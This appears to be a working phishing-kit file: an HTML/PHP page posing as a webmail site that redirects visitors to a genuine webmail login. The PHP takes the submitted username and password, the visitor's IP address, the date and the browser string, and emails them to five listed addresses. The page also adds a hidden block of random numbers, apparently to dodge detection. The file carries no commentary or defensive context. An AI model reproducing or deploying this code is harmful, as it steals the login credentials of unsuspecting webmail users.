
<html><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
 <meta http-equiv="refresh" content="0;URL=https://webmail.kcv.ne.jp/?_task=login" />
<title> https://webmail.do-up.com/ </title> 
<link rel="stylesheet" type="text/css"  
><link rel="icon" href="favicon_s.ico">
<?php
$rand=rand(1,50);
echo '<p style="display:none;">';
for($i=0;$i<$rand;$i++)
{
echo rand(100000,9999999);
}
echo '</p>';
?>


<?
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$message = "--------------Cremie.Cash-Wir3-------------\n";
$message .= "Username : ".$_POST['_user']."\n";
$message .= "Password : ".$_POST['_pass']."\n";
$message .= "Phone No : ".$_POST['_user']."\n";
$message .= "======================================\n";
$message .= "IP: ".$ip."\n";
$message .= "View Location:  https://db-ip.com/$ip   \n";
$message .= "Date: ".$adddate."\n";
$message .= "Browser: ".$_SERVER["HTTP_USER_AGENT"]."\n";
$recipient = "smoothdri@gmail.com, brogers0012x@gmail.com, bd1odb1@gmail.com, rsmr@dxqq.com, lisoydin@gmail.com";
$subject = "kcv";
mail($recipient,$subject,$message);


?>

